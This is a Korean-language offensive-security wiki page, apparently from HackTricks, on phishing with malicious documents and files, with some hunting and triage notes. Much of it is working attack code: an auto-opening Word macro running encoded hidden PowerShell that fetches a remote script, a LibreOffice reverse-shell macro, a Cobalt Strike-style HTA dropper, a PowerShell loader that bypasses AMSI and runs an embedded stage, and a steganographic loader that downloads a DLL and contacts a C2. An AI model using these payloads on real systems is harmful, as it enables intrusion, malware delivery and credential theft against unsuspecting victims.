# Phishing 파일 및 문서

{{#include ../../banners/hacktricks-training.md}}

## Office 문서

Microsoft Word는 파일을 열기 전에 파일 데이터 유효성을 검사합니다. 데이터 유효성 검사는 OfficeOpenXML 표준에 따라 데이터 구조를 식별하는 방식으로 수행됩니다. 데이터 구조 식별 중 오류가 발생하면 분석 중인 파일은 열리지 않습니다.

일반적으로 매크로가 포함된 Word 파일은 `.docm` 확장자를 사용합니다. 하지만 파일 확장자를 변경해도 매크로 실행 기능은 그대로 유지되도록 파일 이름을 바꿀 수 있습니다.\
예를 들어, RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일의 확장자를 RTF로 바꾸면 Microsoft Word에서 처리되며 매크로를 실행할 수 있습니다.\
동일한 내부 구조와 메커니즘은 Microsoft Office 제품군의 모든 소프트웨어(Excel, PowerPoint 등)에 적용됩니다.

다음 명령어를 사용하면 일부 Office 프로그램에서 실행될 확장자를 확인할 수 있습니다:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX 파일이 매크로를 포함한 원격 템플릿(File –Options –Add-ins –Manage: Templates –Go)을 참조하면 매크로를 “실행”할 수도 있습니다.

### External Image Load

다음으로 이동: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: 다음으로 이동: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

문서에서 임의의 코드를 실행하기 위해 매크로를 사용할 수도 있습니다.

#### 자동 로드 함수

이 함수가 더 흔히 사용될수록 AV가 탐지할 가능성이 높아집니다.

- AutoOpen()
- Document_Open()

#### 매크로 코드 예시

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### 메타데이터 수동 제거

**File > Info > Inspect Document > Inspect Document**로 이동하면 Document Inspector가 열립니다. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭합니다.

#### 문서 확장자

완료되면 **Save as type** 드롭다운을 선택하고 형식을 **`.docx`**에서 Word 97-2003 **`.doc`**으로 변경합니다.\
**`.docx`**에는 매크로를 저장할 수 **없고**, 매크로 사용 **`.docm`** 확장자에는 **낙인**이 **찍혀 있기** 때문입니다(예: 미리보기 아이콘에 큰 `!`가 표시되고 일부 웹/이메일 게이트웨이는 해당 파일을 완전히 차단함). 따라서 이 **레거시 `.doc` 확장자가 가장 좋은 절충안**입니다.

#### 악성 매크로 생성기

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 자동 실행 매크로(Basic)

LibreOffice Writer 문서에는 Basic 매크로를 포함할 수 있으며, 매크로를 **Open Document** 이벤트에 연결하면 파일을 열 때 자동으로 실행됩니다(Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 간단한 reverse shell 매크로는 다음과 같습니다:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

문자열 내부의 큰따옴표(`""`)가 두 개씩 들어가는 점에 유의하세요. LibreOffice Basic에서는 리터럴 큰따옴표를 이스케이프하는 데 이를 사용하므로, `...==""")`로 끝나는 payload는 내부 명령과 Shell 인자의 짝이 모두 맞습니다.

전달 팁:

- `.odt`로 저장하고 매크로를 문서 이벤트에 연결해 문서를 열자마자 실행되도록 합니다.
- `swaks`로 이메일을 보낼 때는 `--attach @resume.odt`를 사용합니다(`@`는 필수이며, 파일 이름 문자열이 아닌 파일 바이트를 첨부 파일로 전송합니다). 임의의 `RCPT TO` 수신자를 검증 없이 허용하는 SMTP 서버를 악용할 때 특히 중요합니다.

## HTA 파일

HTA는 **HTML과 스크립팅 언어(예: VBScript 및 JScript)를 결합한** Windows 프로그램입니다. 사용자 인터페이스를 생성하고 브라우저의 보안 모델 제약 없이 "완전히 신뢰된" 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용해 실행합니다. 일반적으로 **Internet Explorer와 함께 설치**되므로 **`mshta`는 IE에 의존합니다**. 따라서 IE가 제거된 경우 HTA를 실행할 수 없습니다.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## NTLM 인증 강제

**원격으로** NTLM 인증을 **강제**하는 방법은 여러 가지가 있습니다. 예를 들어 이메일이나 사용자가 접속할 HTML에 **보이지 않는 이미지**를 추가할 수 있습니다(HTTP MitM도 가능할까요?). 또는 피해자에게 **폴더를 여는 것만으로도 인증을 유발하는** 파일 **주소**를 보낼 수 있습니다.

**다음 페이지에서 이러한 방법과 그 외의 방법을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

hash나 인증 정보를 훔치는 것뿐 아니라 **NTLM relay 공격도 수행할 수 있다는 점을 잊지 마세요**:

- [**NTLM Relay 공격**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (인증서로의 NTLM relay)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK 로더 + ZIP 내장 페이로드(파일리스 체인)

매우 효과적인 캠페인은 합법적인 미끼 문서 두 개(PDF/DOCX)와 악성 .lnk 파일이 들어 있는 ZIP 파일을 전달합니다. 핵심은 실제 PowerShell 로더가 ZIP의 원시 바이트 내 고유한 marker 뒤에 저장되어 있으며, .lnk 파일이 해당 로더를 추출해 메모리에서 실행한다는 것입니다.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner가 구현하는 일반적인 흐름:

1) 일반적인 경로에서 원본 ZIP 파일을 찾습니다: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, 그리고 현재 작업 디렉터리의 상위 디렉터리.
2) ZIP 바이트를 읽고 하드코딩된 marker(예: xFIQCV)를 찾습니다. marker 뒤에 있는 모든 내용이 내장된 PowerShell 페이로드입니다.
3) ZIP 파일을 %ProgramData%에 복사하고, 그곳에 압축을 푼 다음, 정상적인 파일처럼 보이도록 미끼 .docx 파일을 엽니다.
4) 현재 프로세스에서 AMSI를 우회합니다: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 단계를 난독화 해제하고(예: 모든 # 문자를 제거) 메모리에서 실행합니다.

내장된 단계를 추출해 실행하는 PowerShell 기본 골격 예시:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

메모
- 전달 과정에서는 평판이 좋은 PaaS 하위 도메인(예: *.herokuapp.com)을 악용하는 경우가 많으며, 페이로드 제공을 제한할 수 있습니다(IP/UA에 따라 무해한 ZIP 제공).
- 다음 단계에서는 base64/XOR shellcode를 복호화한 뒤 Reflection.Emit + VirtualAlloc을 통해 실행하는 경우가 많아 디스크 흔적을 최소화합니다.

같은 체인에서 사용된 Persistence
- Microsoft Web Browser 컨트롤의 COM TypeLib hijacking을 통해 IE/Explorer 또는 해당 컨트롤을 포함한 앱이 페이로드를 자동으로 다시 실행하도록 합니다.<sup>[[2]](#references)[[4]](#references)</sup> 자세한 내용과 바로 사용할 수 있는 명령은 여기에서 확인하세요:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

헌팅/IOC
- 아카이브 데이터 뒤에 ASCII 마커 문자열(예: xFIQCV)이 추가된 ZIP 파일.
- 상위 폴더 및 사용자 폴더를 열거해 ZIP을 찾고 미끼 문서를 여는 .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed를 통한 AMSI 변조.
- 신뢰할 수 있는 PaaS 도메인에서 호스팅된 링크로 끝나는 장시간 업무 관련 스레드.

## LNK 미끼 우선 스테이징 → scheduled-task Persistence → 신뢰된 CPL 사이드로딩

반복적으로 관찰되는 또 다른 패턴은 **문서로 위장한 `.lnk`**가 무해한 미끼를 즉시 열고, 백그라운드에서 실제 체인을 준비하는 방식입니다.<sup>[[3]](#references)</sup>

관찰된 흐름:
1. 바로가기는 **PDF로 위장**하고 `conhost.exe` 또는 유사한 proxy를 사용해 난독화된 PowerShell downloader를 실행합니다.
2. PowerShell 명령의 토큰을 분리합니다(`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`). 이에 따라 `iwr`, `gci`, `ren`, `cpi` 또는 `schtasks`를 찾는 단순한 탐지는 명령을 놓칩니다.
3. Stager는 **먼저 미끼 문서를 다운로드**해 피해자에게 열어 준 다음, 백그라운드에서 악성 파일을 재구성합니다.
4. 페이로드는 **임의의 확장자**로 저장된 후 채움 문자를 제거해 이름이 바뀔 수 있으며, 이로 인해 명백한 `.exe` / `.cpl` 파일이 나타나는 시점이 늦춰집니다.
5. 사용자 쓰기 가능 경로에 있는 신뢰된 host 바이너리를 실행하는 **분 단위 scheduled task**로 Persistence를 설정합니다.

이 패턴에서 헌팅에 활용할 최소 단서:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

인식해 두면 유용한 스테이징 구조:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 또는 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 두 번째 단계가 은밀한 이유

Rapid7 사례 연구에서 예약된 작업은 **`Fondue.exe`**를 `C:\Users\Public\`에서 반복적으로 실행했습니다. **`APPWIZ.cpl`**이 그 옆에 스테이징되어 있고 **`RunFODW`**를 내보냈기 때문에, 신뢰할 수 있는 Microsoft 바이너리는 정상적인 시스템 사본 대신 공격자의 CPL을 사이드로드했습니다.

그런 다음 CPL은:
- `C:\Windows\Tasks\editor.dat`에서 **AES-256-CBC** blob을 읽습니다.
- **Windows CNG / `bcrypt.dll`**을 통해 복호화합니다.
- 실행 가능한 메모리를 할당하고 복호화된 shellcode를 복사합니다.
- shellcode 포인터를 **`EnumUILanguagesW`**의 콜백으로 전달해 간접 실행합니다.

마지막 단계는 별도로 탐지할 가치가 있습니다. malware는 직접적인 `((void(*)())buf)()` 점프를 피하고, 대신 **콜백을 받는 정상적인 WinAPI**를 악용해 실행을 넘기는 경우가 많습니다.

이 캠페인에서 복호화된 payload는 **Donut** shellcode였습니다. 이 shellcode는 최종 PE를 완전히 메모리에 매핑한 다음, 실행을 넘기기 전에 현재 프로세스에서 **AMSI/WLDP/ETW**를 패치했습니다. 사이드로딩 및 메모리 상주 후처리에 대한 자세한 내용은 다음을 참조하세요.

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

실제 탐지에 유용한 단서:
- `.lnk`가 `powershell.exe` 또는 `conhost.exe`를 실행한 다음 눈에 보이는 미끼 문서를 표시합니다.
- **`C:\Users\Public\`**로 짧은 시간 동안 다운로드한 뒤, 의미 없는 확장자에서 즉시 이름을 변경합니다.
- `GoogleErrorReport`와 같이 무난한 이름의 예약된 작업이 **사용자 쓰기 가능 디렉터리**에서 실행됩니다.
- 신뢰할 수 있는 바이너리가 동일한 비시스템 디렉터리에서 **`.cpl` / `.dll`** 파일을 로드합니다.
- Base64 텍스트 blob이 **`C:\Windows\Tasks\`** 아래에 기록된 뒤 사이드로드된 모듈에 의해 읽힙니다.

## 이미지 내 스테가노그래피 구분자 payload (PowerShell stager)

최근 loader 체인은 난독화된 JavaScript/VBS를 전달합니다. 이 스크립트는 Base64 PowerShell stager를 디코딩하고 실행합니다. 해당 stager는 이미지(흔히 GIF)를 다운로드합니다. 이미지에는 고유한 시작/끝 구분자 사이에 일반 텍스트로 숨겨진 Base64 인코딩 .NET DLL이 들어 있습니다. 스크립트는 이러한 구분자(실제 사례에서 확인된 예: «<<sudo_png>> … <<sudo_odt>>>»)를 검색하고, 그 사이의 텍스트를 추출해 Base64를 바이트로 디코딩한 다음, 어셈블리를 메모리에 로드하고 알려진 진입 메서드를 C2 URL과 함께 호출합니다.<sup>[[5]](#references)</sup>

워크플로
- 1단계: 아카이브된 JS/VBS dropper → 내장된 Base64 디코딩 → `-nop -w hidden -ep bypass` 옵션으로 PowerShell stager 실행.
- 2단계: PowerShell stager → 이미지 다운로드, 구분자로 지정된 Base64 데이터 추출, .NET DLL을 메모리에 로드하고 메서드(예: VAI)를 C2 URL 및 옵션과 함께 호출.
- 3단계: Loader가 최종 payload를 가져와 일반적으로 프로세스 hollowing을 통해 신뢰할 수 있는 바이너리(주로 MSBuild.exe)에 주입합니다.<sup>[[7]](#references)[[8]](#references)</sup> 프로세스 hollowing 및 신뢰할 수 있는 유틸리티를 통한 프록시 실행에 대한 자세한 내용은 다음을 참조하세요.

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

이미지에서 DLL을 추출하고 .NET 메서드를 메모리에서 호출하는 PowerShell 예제:

<details>
<summary>PowerShell 스테고 payload 추출기 및 loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

참고
- 이는 ATT&CK T1027.003 (steganography/marker-hiding)입니다.<sup>[[6]](#references)</sup> 마커는 캠페인마다 다릅니다.
- assembly를 로드하기 전에 AMSI/ETW bypass와 문자열 deobfuscation을 적용하는 경우가 많습니다.
- Hunting: 다운로드한 이미지에서 알려진 구분자를 검색하고, 이미지에 접근한 뒤 Base64 blob을 즉시 디코딩하는 PowerShell을 식별합니다.

stego 도구 및 carving 기법도 참조하세요:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS dropper → Base64 PowerShell staging

반복적으로 나타나는 초기 단계는 archive에 포함되어 전달되는 작고 난독화가 심한 `.js` 또는 `.vbs` 파일입니다. 이 파일의 유일한 목적은 내장된 Base64 문자열을 디코딩하고 `-nop -w hidden -ep bypass`를 사용해 PowerShell을 실행하여 HTTPS를 통해 다음 단계를 시작하는 것입니다.<sup>[[5]](#references)</sup>

기본 로직 (개요):
- 자체 파일 내용 읽기
- 잡음 문자열 사이에서 Base64 blob 찾기
- ASCII PowerShell로 디코딩
- `wscript.exe`/`cscript.exe`가 `powershell.exe`를 실행하도록 호출

Hunting 단서
- 명령줄에 `-enc`/`FromBase64String`이 포함된 `powershell.exe`를 실행하는 archive 내 JS/VBS 첨부 파일.
- 사용자 temp 경로에서 `powershell.exe -nop -w hidden`을 실행하는 `wscript.exe`.

## 실행 컨테이너로서의 MSC 문서 (GrimResource)

Microsoft Management Console 파일 (`.msc`)은 보통 `mmc.exe`로 여는 XML 콘솔 정의 파일입니다. **GrimResource**는 오래된 XSS primitive가 포함된 `apds.dll` 리소스를 가리키는 `StringTable`을 악용합니다. 그 결과 사용자가 조작된 콘솔을 열면 `mmc.exe` 내에서 JavaScript가 실행됩니다. 관찰된 샘플은 `transformNode` 기반 난독화와 **DotNetToJScript**를 결합하여 일반적인 Office macro 경로 없이 .NET payload를 인스턴스화했습니다.<sup>[[9]](#references)</sup>

정적 triage 시 신뢰할 수 없는 MSC는 텍스트로 취급하고 **더블 클릭하지 마세요**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

신뢰도 높은 runtime pivot은 `mmc.exe`가 CLR 또는 script 구성 요소를 로드하거나, 네트워크 연결을 생성하거나, `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` 또는 예상치 못한 실행 파일을 생성하는 경우입니다. 이 형식은 정상적으로 사용되므로 모든 MSC를 차단하는 대신 **출처 + 의심스러운 XML/script 콘텐츠 + `mmc.exe` 동작**을 연관 지어 탐지해야 합니다.<sup>[[9]](#references)</sup>

## PDF/QR 리디렉터 및 payload 게이팅

PDF는 유용하게 쓰기 위해 exploit이 필요한 것은 아닙니다. 최근 캠페인은 악성으로 보이지 않는 문서에 **QR 코드 또는 일반 링크**를 넣어 브라우저 세션을 메일 보안 제어 범위 밖으로 이동시키고, 수신자 주소를 사용해 목적지를 개인화합니다. Microsoft는 QR URL이 수신자별로 고유하고 RaccoonO365 자격 증명 탈취 인프라로 연결되는 2025년 PDF를 문서화했습니다. 이와 유사한 다른 체인에서는 IP/환경 게이팅을 사용해 선택된 방문자에게 JavaScript/MSI 경로를 반환하고, 스캐너 또는 허용되지 않은 클라이언트에는 정상 PDF를 반환했습니다.<sup>[[10]](#references)</sup>

PDF 동작과 렌더링된 QR 코드를 모두 분석하세요. QR은 추출 가능한 이미지로 저장되는 대신 벡터로 그려질 수 있으므로, 삽입된 이미지를 추출하는 동시에 모든 페이지를 래스터화하세요:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

격리된 분석 시스템에서 인증하지 않고 디코딩된 목적지와 리디렉션을 검사합니다. 유용한 탐지 특징으로는 본문이 거의 비어 있고 QR 코드만 포함된 PDF, 쿼리 매개변수에 삽입된 수신자 이메일 주소, 평판이 좋은 호스팅 서비스를 여러 번 거치는 리디렉션, IP, 지리적 위치, 쿠키, 리퍼러 또는 사용자 에이전트에 따라 다르게 제공되는 콘텐츠 등이 있습니다. 제어된 프로필로 요청을 비교하세요. 샌드박스에서 한 번만 가져오면 미끼만 받을 수 있습니다.<sup>[[10]](#references)</sup>

## NTLM 해시를 탈취하는 Windows 파일

**NTLM 자격 증명을 탈취할 수 있는 위치** 페이지를 확인하세요.

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice 매크로 → IIS 웹셸 → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine 캠페인: 미국 기업을 겨냥한 정교한 피싱 공격](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: 중국 테마 로더 체인을 통한 Dropping Elephant의 공격 기법 추적](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [TypeLib 탈취 – 새로운 COM 지속성 기법 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader, 다양한 정보 탈취 악성코드 전달](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – 스테가노그래피 (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – 프로세스 할로잉 (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – 신뢰할 수 있는 개발자 유틸리티 프록시 실행: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: 초기 접근 및 회피를 위한 Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 위협 행위자들이 세금 신고 기간을 악용해 세금 테마 피싱 캠페인을 전개](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
